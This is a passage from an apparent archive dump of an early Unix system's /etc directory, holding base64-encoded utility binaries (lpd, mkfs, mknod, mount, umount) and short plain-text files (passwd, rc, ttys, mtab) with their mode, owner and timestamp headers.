YQwB2cGwQBJhDAHZYbAAFmEKYQ5hAmEcgJhBWDFYIVgRWAFQYAZhGFEQ2JphBCHQQAEhBS
EIIVhRWHAGYRhRH3CUQAJhAHiQOG1gt3AOAA1gsCA30QBACFFYcAZhGFEUAdBAB3HQYAVB
p3HQgAUBoAiZ4gAoZ3ALYAhRWHAGYRhRFAHQQAAYlmEUEdAgCFEQAKdyz8/yoaAgLAFQIA
dyIkGgMCwGUCACIBdyIaGgMCwGUEABwBdyIQGgMCQGwCABYBdyIIGgUCQWwCAMFlBADmAX
esAQD7GQoCJhBAEsAAF3T5/wFgwWUCAIAV2AGADIUVhwB3CRwAdxGqGncdAgCmGncAHADF
HZwa9R2aGgIAdwAOAEARhREmEeYQphDmC0gAQRFEGEMYQhhGEYUVhwA3EDAawBX//0YRhR
WHAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAGPYg9gAABAFAAVgBL2Jpbi9z
aAAtAC9ldGMvcmMAL2V0Yy9pbml0AC9ldGMvdHR5cwAvZXRjL3V0bXAAL3Vzci9hZG0vd3
RtcAAvZGV2L3R0eTgALwAvZGV2L3R0eXgAZXRjL2dldHR5AA+JAAAAABCJAAAAAAiJAAAA
AAuJAAAAACWJAAAFiQAAAAADiQAAAAATiQAAAAAwiQAAAAAEiQAAAADfCQAA1guWJcZlAA
B3AEzf/wE=
-- /etc/lpd mode=0106775 uid=1 gid=1 atime=174923159 mtime=174923159 base64=1 --
BwHKAlQAuAcAAAAAAAABADCJAQABADCJAgABADCJAwABABKJwAFGCRyGCInAAQAAGIcFic
4BAAAShwEQQBADiSIDEAAMh8ALCgP3C+QC9gPXLeACZGbyAgKJBAEBiQqJwAEBiXcJUgHA
FbgBdwnWATQDDYcMic4BCocFic4BAAAGhzcQqgINAQqJwAEBiXcJKAHAFQoAI4kSicABRg
n0h+EBwB2KAhOJAAAAAMAdgAIDiSIDEADrh8AL5gP3C3IC9QPAFSQDFyJkZvACdwkYAToF
7IfBFUYJdwksAToFFocJkBcgCQAEA1ekCgD1AgkB0ZUgAFcgTgnvA1cgVgnshvcBwJ1QCH
cJuAFMAcAdOgQTiQAAAAAHAXcJ7AA6BRiHFyAKAPkCdwneADoFEYcXIFUA9gLBFUYJdwnM
ADoFCIcRkBcgCgD4AiGKColGCesBwB32AwaJCokkA6MBTABgAUIAfgFGAGQBVQDEAAAAAA
B3AGD/IYrAFUcJdwlqAEAHqYfAFQwAdwneADQDBwEhisAVRwl3CVAAQAech3cJaABABwSH
dwnAADQD+AF3CdgANAPAHZoFBomNAcEVCQBAEAaJwQr8BIUAL2Rldi9scAAvdXNyL2xwZC
9sb2NrAC91c3IvbHBkAABmEEEVNxDsAACJygIEhxEQEQqBFYUAyRX//4EVsQCFAGYQQRXx
CgIAEwRAEMBlBgA3EOYAMRAEAEASAInwAgKHwAsDAoEVsQCFAMAKMRACAAAKQN4EALEKBA
CBFYUAZhBBFTcQugAAifYCBYcREBEKEQqBFYUA0RX//4EVsQCFAGYQQRXxCgIABQQmEPcJ
IACAFfgBOZAEALEKBACBFYUAJhBmEEEV9wkGAIEVgBWFAEAQwGUGACYQNxCGAHccBACCAA
UDt+N8AEASAIkYA7EVBADxFQACAgCHAGYQQRURIAQD0Qv8AoEVhQBBFPwDRRD6AQWJAAAA
AHcTFAB3FQQAdwkc/wAAAYaFACYQdwkQ/wAAwACAVYUAA4kAAAACCIkAALYBdxMKAHcVEA
AmEHcJTv8AAIAVwAB3CUT/AACFAASJAAAAAA==
-- /etc/mkfs mode=0110775 uid=3 gid=3 atime=174923253 mtime=174923253 base64=1 --
BwEaD+YB/gcAAAAAAAABAAnwgBEmEtALNhACAPcJCAAOEN8JxA4BiXcJsg7G5QQAzhWgEt
8JjA71JQMABAAGA84VSg/fCZAL9wmIDkAdBgA3HAIAnBY1Cvb/HQHAHZIWQG32/8ilcgAU
AvUlawD4/wYC9xUYALIO9xUDAK4O9SVwAPj/BgL3FQoAng73FQQAmg61Cvb/wB1YFkBt9v
8AnAEANRD4/9oCQB0GADccBABCFs4VtgHmHTgW3wkKDtYLNxD4EwkEzh0oFuYVVQ/fCZAL
1gv3CfwNDgrmHRQW3wkoDtYLNxDSEwkEzh0EFuYVaA/fCZAL1gv3CdgNDgrmHfIV3wkoDt
YLNxCoEV8ENQr2/zUK+P8nAcAd2BVAbfj/yKUwAAcGwB3KFUBt+P/IpTkACQTOHbwV5hV5
D98JkAvWC/cJjg1BHfb/V3AKAMIdohVCbfj/gpKBYMFl0P91EPb/tQr4/8AdihVAbfj/yI
vTAncd9v+aD84V6ANmHfb/JgrfCfgOliUOEM5lKwBmHfb/JgrfCfgOliU3EHIPDhDmFYoP
3wmQC9YL9yUBAHoNCQPOHXQN5h1yDeYVlg/fCZALliX3FacP9BJPAfcJCgYOCuYVsBbfCS
gO1gs1EPj/CATOFbAW5hW1D98JkAvWCzQBzhUQAOYVsBRmHfj/3wlGDpYl9yUHAbYSDAPO
FbAW5hXMDwQBzhWwFuYV3A/fCZALFgHAHZoSwG2YEjUQ9v/AJQAC8AUOEOYVsBRmHfj/3w
lGDpYlzhWwFCYK3wmICNYLTh34/98J9A33CQwFNxCwDvcJBAU3EKYO9y2kDqAOCYfAHZwO
wO2WDsBl/v/ALY4OC4POHYgO5h2GDuYV6Q/fCZALliX3CToM9wkSCDUK9v9AHfb/wAwwCr
AUtQr2//UlAAH2//UGNQr2/wsBzhWwFGYd9v/OZQIA3wmICNYLtQr2//UtOA72//ECDgrf
CQoDNQr2/0Ad9v/ADDAKsBS1Cvb/9SUAAfb/9Qb3HbAPqg/3HawPpg/OFQAR5hUBAN8JiA
jWC3cA0gt3CcALxuUuBPcJtAT1FQCA2v/OFQBA5hUAIOYVAGDmFfsPwJ2AEyYQ3wn6BsZl
CAA1UNr/zhUACOYV/w/AnWcTJhDfCfoGliU1UNr/zhUABOYVARDAnVATJhDfCfoGliU1UN
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
kAAAAABIkAAAAA
-- /etc/mknod mode=0100775 uid=3 gid=3 atime=174929778 mtime=174923263 base64=1 --
BwEuBPwCFAIAAAAAAAABAAnwgBEmEtALNhACAPcJCAAOEN8J+gMBiXcJ6APG5QYA9SUFAA
QABQPOFS4E3wmQATMBQB0GAPilYgAEADMC9RW24fj/QB0GAA4cBgDfCbgANRD2/yEFQB0G
AA4cCADfCbgANRD0/xgFQB32/xd0CAAOEE5d9P9mHfj/QB0GACYcAgDfCbIDliXACwQEzh
U5BN8JBgH3CWIDzhU/BN8JkAF3AG4DQB0GAPilYwAEAPQC9RW2ofj/xgF3CUgDxuUEADUK
+P8WAfUlMAD2/wQG9SU5APb/BATAFf//dwA0A0Ed+P9XcAoAQW32/8Fl0P91EPj/QJ8EAL
UKBAA1EPb/4wJAHfj/6gF3CfoCxBViBPct6gMWBgUHwB0QBsAMBBy6BE4dBADfCXgBAxAR
A84QZh0EAOYVAgDfCdgDliXOFQIA5hVwBOYVAgDfCdgDliUOEd8JeAEOECYR5hUCAN8J2A
OWJc4VAQDmFXME5hUCAN8J2AOWJXcAmgJ3CYgCRB0EANSL/gIAEUDtBADACncAggJ3CXAC
xuV+AHcdBACSBUQRxGUGAMCfiAUJA7cKggUXICUABgMOEN8JQgP0AXcAUgI3Cm4FNwpuBd
evZAUtAAQCtwpcBbcKWgX3CCgBdxBOBTcKUAUXIC4ABAL3CBYBdxBEBYMRw2UEAMEVdgRC
FNoDESD8AkoAARUFBAEL05UtAAEBARX3CQIAUgEAChdyCgBmEAEQAgP3CfD/gBXAZTAAE5
CHABOVAQLDChOVQALDCj4BwR3wBAMKAhPSiwIDgwpEfgIVOAHCFZ4EAgHCFaIEARUFA/cL
zgQCA9OVMAAACvcJAgAkAWYQCnYCA/cJ9v+AFYBMAgDAZTAAFyA5AAIHwGUHABOQhwDAHZ
oEwh2UBPcJlAAMAcAdjATCHYYE9wmGAAUBBBU3FXYEdwDm/oIRwmUEAIPgJhHmFSAAxBAD
C8NtWgQGB/cLWAQDAt8JQgPDfsQLBAOOlN8JQgMEf8MLBQfOFSAA3wlCA8N+1guEFXcAoP
43CiwEAQrAnyIEtwoeBMDlMAAXIPr/AgIAFQMBFyAJAAaCtwoKBFdwCgABYOwBwGUwAIMA
xGUIANOVPwCHAGYRhRHAHfIDBAL3CSwAwB3oA1CdBAAHA7cK3gP3CtgDAgb3CRQAQB0EAI
UVhwBmEYUR9wkEAIUVhwDAHbwDCgPA5T4HNxAgAcAdqgMBAoAKAImmBPcVPgegA/cVAAKY
A9ctkgMCAAOC9xUBAIoDhwBmEYURdx0EAPIAdx0GAO4Adx0IAOoAAImsBAKGdwBOAAAKhR
WHAGYRhRFAHQQAdx0GANAAdx0IAMwAAIm0BAKGdwAqAIUVhwBmEYURQB0EAAGJQBGFESYR
5hCmEOYLSABBEUQYQxhCGEYRhRWHADcQBgPAFf//RhGFFYcAYXJnIGNvdW50CgBta25vZA
B1c2FnZTogbWtub2QgbmFtZSBiL2MgbWFqb3IgbWlub3IKAFVua25vd24gZXJyb3IAOiAA
CgAABgJkAFwCbwBWAngAmAJmAKYCZQA0AmMAQgJzABICbAC0AnIAAAAAAPz/8P/9//j/BI
k+BwAADokAAAAAAAAEiQAAAAD+BAYFFQUvBT8FVwVhBXsFjQWfBa8FuwXNBd0F7wX4BQ4G
IAYsBj4GTQZdBmwGfQaRBqUGtgbFBtQG7Ab5Bg8HHgchAEVycm9yIDAATm90IHN1cGVyLX
VzZXIATm8gc3VjaCBmaWxlIG9yIGRpcmVjdG9yeQBObyBzdWNoIHByb2Nlc3MASW50ZXJy
dXB0ZWQgc3lzdGVtIGNhbGwASS9PIGVycm9yAE5vIHN1Y2ggZGV2aWNlIG9yIGFkZHJlc3
MAQXJnIGxpc3QgdG9vIGxvbmcARXhlYyBmb3JtYXQgZXJyb3IAQmFkIGZpbGUgbnVtYmVy
AE5vIGNoaWxkcmVuAE5vIG1vcmUgcHJvY2Vzc2VzAE5vdCBlbm91Z2ggY29yZQBQZXJtaX
NzaW9uIGRlbmllZABFcnJvciAxNABCbG9jayBkZXZpY2UgcmVxdWlyZWQATW91bnQgZGV2
aWNlIGJ1c3kARmlsZSBleGlzdHMAQ3Jvc3MtZGV2aWNlIGxpbmsATm8gc3VjaCBkZXZpY2
UATm90IGEgZGlyZWN0b3J5AElzIGEgZGlyZWN0b3J5AEludmFsaWQgYXJndW1lbnQARmls
ZSB0YWJsZSBvdmVyZmxvdwBUb28gbWFueSBvcGVuIGZpbGVzAE5vdCBhIHR5cGV3cml0ZX
IAVGV4dCBmaWxlIGJ1c3kARmlsZSB0b28gbGFyZ2UATm8gc3BhY2UgbGVmdCBvbiBkZXZp
Y2UASWxsZWdhbCBzZWVrAFJlYWQtb25seSBmaWxlIHN5c3RlbQBUb28gbWFueSBsaW5rcw
BCcm9rZW4gUGlwZQA=
-- /etc/mount mode=0104775 uid=3 gid=3 atime=174926712 mtime=174923274 base64=1 --
BwEaBQoDFAYAAAAAAAABAAnwgBEmEtALNhACAPcJCAAOEN8J5gQBiXcJ1ATG5QQADgrmFR
oF3wmEBNYLNRD2/84VAATmFSQIZh32/98JogSWJfUlAQAEABMCwxUkCMMlJAwWg8uLCQPO
EOYQzmUgAOYVJAXfCR4CliXDZUAA7wH1JQMABAAGB84VLgXfCR4CdwB6BAQK9SUDAAQAAQ
SECg4RQB0GACYcBABAHQYAJhwCAN8JXgSWJcALBQTOFTkF3wmUAeUBQB0GAAIcAgDSi/4C
wgoBAQqK4qUvAPwDQB0GALAgAgADg+KlLwD4AsqlLwABAoIKQB0GALAQAgDDFSQIwyUkDM
SDy4tJAsIQwmUgAAwBQR0GAEAcAgCxCgIAEpIEAkAdBgDwCgIAwBDAZT8AgCDvh8IQDAFB
HQYAQBwEALEKBAASkgQCQB0GAPAKBADAEMBlHwCAIO+HwxUkDMPlQADLi/wDzhWkAeYVPw
XfCUAE1gs1EPb/wBDA5SQIF3T6/4AKF3QGAA4Q5hUkCGYd9v/fCcQEliVfAIAAw2VAAK8B
dwlYA8QVSgX3LVYEggoFB8AdfArADAQctAVOHQQA3wkGAgMQEQPOEGYdBADmFQIA3wnEBJ
YlzhUCAOYVWAXmFQIA3wnEBJYlDhHfCQYCDhAmEeYVAgDfCcQEliXOFQEA5hVbBeYVAgDf
CcQEliV3APgCdwnmAkQdBADUi/4CABFA7QQAwAp3AOACdwnOAsblfgB3HQQA/glEEcRlBg
DAn/QJCQO3Cu4JFyAlAAYDDhDfCdAD9AF3ALACNwraCTcK2gnXr9AJLQAEArcKyAm3CsYJ
9wgoAXcQugk3CrwJFyAuAAQC9wgWAXcQsAmDEcNlBADBFV4FQhTaAxEg/AJKAAEVBQQBC9
OVLQABAQEV9wkCAFIBAAoXcgoAZhABEAID9wnw/4AVwGUwABOQhwATlQECwwoTlUACwwo+
AcEdXAkDCgIT0osCA4MKRH4CFTgBwhWGBQIBwhWKBQEVBQP3CzoJAgPTlTAAAAr3CQIAJA
FmEAp2AgP3Cfb/gBWATAIAwGUwABcgOQACB8BlBwATkIcAwB0GCcIdAAn3CZQADAHAHfgI
wh3yCPcJhgAFAQQVNxXiCHcA5v6CEcJlBACD4CYR5hUgAMQQAwvDbcYIBgf3C8QIAwLfCd
ADw37ECwQDjpTfCdADBH/DCwUHzhUgAN8J0APDftYLhBV3AKD+NwqYCAEKwJ+OCLcKigjA
5TAAFyD6/wICABUDARcgCQAGgrcKdghXcAoAAWDsAcBlMACDAMRlCADTlT8AhwBmEYURwB
1eCAQC9wksAMAdVAhQnQQABwO3CkoI9wpECAIG9wkUAEAdBACFFYcAZhGFEfcJBACFFYcA
wB0oCAoDwOU4DDcQegHAHRYIAQKACgCJjgX3FTgMDAj3FQACBAjXLf4HAgADgvcVAQD2B4
cAZhGFEXcdBABMAXcdBgBIAQCJlAUChncAsgCFFYcAZhGFEbcdBAA0AbcdBgAwAbcdCAAs
AQCJmgUChncAjgAACoUVhwBmEYURdx0EABYBdx0GABIBAImiBQKGdwBuAIUVhwBmEYURQB
0EAHcdBgD6AHcdCAD2AACJqAUChncATACFFYcAZhGFEUAdBAB3HQYA3gB3HQgA2gAAia4F
AoZ3ACoAhRWHAGYRhRFAHQQAAYlAEYURJhHmEKYQ5gtIAEERRBhDGEIYRhGFFYcANxAUB8
AV//9GEYUVhwAvZXRjL210YWIAJXMgb24gJXMKAGFyZyBjb3VudAoAbW91bnQAL2V0Yy9t
dGFiAABVbmtub3duIGVycm9yADogAAoAAJQCZADqAm8A5AJ4ACYDZgA0A2UAwgJjANACcw
CgAmwAQgNyAAAAAAD8//D//f/4/wSJOAwAAAiJAAAAABWJAAAAAAAABYkAAAAAA4kAAAAA
BIkAAAAA+AUABg8GKQY5BlEGWwZ1BocGmQapBrUGxwbXBukG8gYIBxoHJgc4B0cHVwdmB3
cHiwefB7AHvwfOB+YH8wcJCBgIIQBFcnJvciAwAE5vdCBzdXBlci11c2VyAE5vIHN1Y2gg
ZmlsZSBvciBkaXJlY3RvcnkATm8gc3VjaCBwcm9jZXNzAEludGVycnVwdGVkIHN5c3RlbS
BjYWxsAEkvTyBlcnJvcgBObyBzdWNoIGRldmljZSBvciBhZGRyZXNzAEFyZyBsaXN0IHRv
byBsb25nAEV4ZWMgZm9ybWF0IGVycm9yAEJhZCBmaWxlIG51bWJlcgBObyBjaGlsZHJlbg
BObyBtb3JlIHByb2Nlc3NlcwBOb3QgZW5vdWdoIGNvcmUAUGVybWlzc2lvbiBkZW5pZWQA
RXJyb3IgMTQAQmxvY2sgZGV2aWNlIHJlcXVpcmVkAE1vdW50IGRldmljZSBidXN5AEZpbG
UgZXhpc3RzAENyb3NzLWRldmljZSBsaW5rAE5vIHN1Y2ggZGV2aWNlAE5vdCBhIGRpcmVj
dG9yeQBJcyBhIGRpcmVjdG9yeQBJbnZhbGlkIGFyZ3VtZW50AEZpbGUgdGFibGUgb3Zlcm
Zsb3cAVG9vIG1hbnkgb3BlbiBmaWxlcwBOb3QgYSB0eXBld3JpdGVyAFRleHQgZmlsZSBi
dXN5AEZpbGUgdG9vIGxhcmdlAE5vIHNwYWNlIGxlZnQgb24gZGV2aWNlAElsbGVnYWwgc2
VlawBSZWFkLW9ubHkgZmlsZSBzeXN0ZW0AVG9vIG1hbnkgbGlua3MAQnJva2VuIFBpcGUA

-- /etc/mtab mode=0100644 uid=0 gid=3 atime=174929344 mtime=174929344 base64=1 --
L3Vzci9zb3VyY2UAAAAAAAAAAAAAAAAAAAAAAAAAAABycDEAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAA==
-- /etc/passwd mode=0100644 uid=3 gid=3 atime=174929760 mtime=170480768 --
root::0:3::/:
daemon::1:1::/:
bin::3:3::/bin:
ken::6:1::/usr/ken:
-- /etc/rc mode=0100664 uid=3 gid=3 atime=174921389 mtime=169258453 --
rm -f /etc/mtab
/etc/update
-- /etc/ttys mode=0100664 uid=3 gid=3 atime=174921389 mtime=169258453 --
000
010
020
030
040
050
060
070
18-
090
0a0
0b0
0f0
0g0
0h0
0i0
0j0
0k0
0l0
0m0
0n0
0o0
0p0
0q0
0r1
0s0
0t2
0u0
-- /etc/umount mode=0104775 uid=3 gid=3 atime=174929343 mtime=174923843 base64=1 --
BwG2BBQDFAYAAAAAAAABAAnwgBEmEtALNhACAPcJCAAOEN8JggQBiXcJcATmC/cJGgQOCu
YVtgTfCfwD1gs1EPj/zhUABOYVygdmHfj/3wkaBJYl9SUCAAQABQPOFcAE3wm8AWwBQB0G
AA4cAgDfCUYEwAsFBM4VywTfCTIBXwFAHQYAAxwCANOL/gLDCgEBC4rjpS8A/ANAHQYA8C
ACAAOD46UvAPgCy6UvAAECgwpAHQYA8BACAMQVygdAHQYAAxwCAAIRwmUgAJOiKgLSi/wC
AxEBAROKABHAZUAAwCD6h8QVygvE5UAAzIv8A84VpAHmFdIE3wneA9YLNRD4/wARwOXKBx
d0+v+AChd0BgAOEOYVygdmHfj/3wlgBJYlDgHEZUAAxCXKC8iCQB0GAA4cAgDmFdwE3wm8
AdYLdwBoA3cJVgPEFfQE9y1eBIoKBQfAHYQKwAwEHFoFTh0EAN8JpAEDEBEDzhBmHQQA5h
UCAN8JYASWJc4VAgDmFQIF5hUCAN8JYASWJQ4R3wmkAQ4QJhHmFQIA3wlgBJYlzhUBAOYV
BQXmFQIA3wlgBJYldwD2AncJ5AJEHQQA1Iv+AgARQO0EAMAKdwDeAncJzALG5X4Adx0EAA
YKRBHEZQYAwJ/8CQkDtwr2CRcgJQAGAw4Q3wluA/QBdwCuAjcK4gk3CuIJ16/YCS0ABAK3
CtAJtwrOCfcIKAF3EMIJNwrECRcgLgAEAvcIFgF3ELgJgxHDZQQAwRUIBUIU2gMRIPwCSg
ABFQUEAQvTlS0AAQEBFfcJAgBSAQAKF3IKAGYQARACA/cJ8P+AFcBlMAATkIcAE5UBAsMK
E5VAAsMKPgHBHWQJAwoCE9KLAgODCkR+AhU4AcIVMAUCAcIVNAUBFQUD9wtCCQID05UwAA
AK9wkCACQBZhAKdgID9wn2/4AVgEwCAMBlMAAXIDkAAgfAZQcAE5CHAMAdDgnCHQgJ9wmU
AAwBwB0ACcId+gj3CYYABQEEFTcV6gh3AOb+ghHCZQQAg+AmEeYVIADEEAMLw23OCAYH9w
vMCAMC3wluA8N+xAsEA46U3wluAwR/wwsFB84VIADfCW4Dw37WC4QVdwCg/jcKoAgBCsCf
lgi3CpIIwOUwABcg+v8CAgAVAwEXIAkABoK3Cn4IV3AKAAFg7AHAZTAAgwDEZQgA05U/AI
cAZhGFEcAdZggEAvcJLADAHVwIUJ0EAAcDtwpSCPcKTAgCBvcJFABAHQQAhRWHAGYRhRH3
CQQAhRWHAMAdMAgKA8Dl3gs3EIYBwB0eCAECgAoAiTgF9xXeCxQI9xUAAgwI1y0GCAIAA4
L3FQEA/geHAGYRhRF3HQQAWAF3HQYAVAEAiT4FAoZ3ALAAhRWHAGYRhRF3HQQAQAF3HQYA
PAEAiUQFAoZ3AJIAhRWHAGYRhRFAHQQAdx0GACQBdx0IACABAIlKBQKGdwBwAIUVhwBmEY
URJImFFYcAZhGFEbcdBAACAQCJUAUChncATgAACoUVhwBmEYURQB0EAHcdBgDoAHcdCADk
AACJVAUChncAKgCFFYcAZhGFEUAdBAABiUARhREmEeYQphDmC0gAQRFEGEMYQhhGEYUVhw
A3EB4HwBX//0YRhRWHAC9ldGMvbXRhYgBhcmcgY291bnQKAHVtb3VudAAvZXRjL210YWIA
JXMgbm90IGluIG1vdW50IHRhYmxlCgAAVW5rbm93biBlcnJvcgA6IAAKAAAyAmQAiAJvAI
ICeADEAmYA0gJlAGACYwBuAnMAPgJsAOACcgAAAAAA/P/w//3/+P8Eid4LAAAIiQAAAAAF
